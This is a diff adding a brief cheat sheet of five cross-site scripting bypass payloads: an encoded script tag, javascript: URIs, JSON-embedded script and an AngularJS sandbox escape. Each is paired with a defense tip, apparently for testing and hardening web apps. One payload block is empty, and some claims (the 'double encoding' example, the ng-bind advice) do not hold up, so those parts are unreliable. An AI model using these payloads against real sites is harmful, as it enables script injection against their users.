@@ -1,0 +1,55 @@
+1. Double Encoded HTML Entity Bypass
+Some applications attempt to filter <script> but fail when decoding occurs twice.
+
+Payload:
+html
+Copy
+Edit
+&lt;script&gt;alert(1)&lt;/script&gt;
+✅ Defense: Ensure input is properly sanitized before storing and always encode output based on the context.
+
+2. JavaScript Event Handler Injection
+Sometimes applications allow event handlers inside tags like <img> or <svg>, even after encoding.
+
+Payload:
+html
+Copy
+Edit
+
+or
+
+html
+Copy
+Edit
+<IMG SRC="javascript:alert(1);">
+✅ Defense: Use a strict Content Security Policy (CSP) and sanitize all user-generated HTML.
+
+3. Nested Encoding to Break Out of Attributes
+Some applications filter onerror= but fail to catch double encoding.
+
+Payload:
+html
+Copy
+Edit
+<a href="javascript&#x3A;alert(1)">Click Me</a>
+✅ Defense: Disallow JavaScript URIs in <a> tags and use attribute-based escaping.
+
+4. JSON-based XSS Injection
+If your application renders JSON data unsafely, you can test with this payload:
+
+Payload:
+json
+Copy
+Edit
+{"name":"<script>alert(1)</script>"}
+✅ Defense: Ensure your JSON output is escaped properly when rendered in JavaScript (JSON.stringify).
+
+5. AngularJS-based XSS Bypass
+If the application uses AngularJS and does not properly sanitize inputs:
+
+Payload:
+html
+Copy
+Edit
+{{constructor.constructor('alert(1)')()}}
+✅ Defense: Use ng-bind instead of ng-model, and update to the latest AngularJS version to avoid sandbox bypasses.
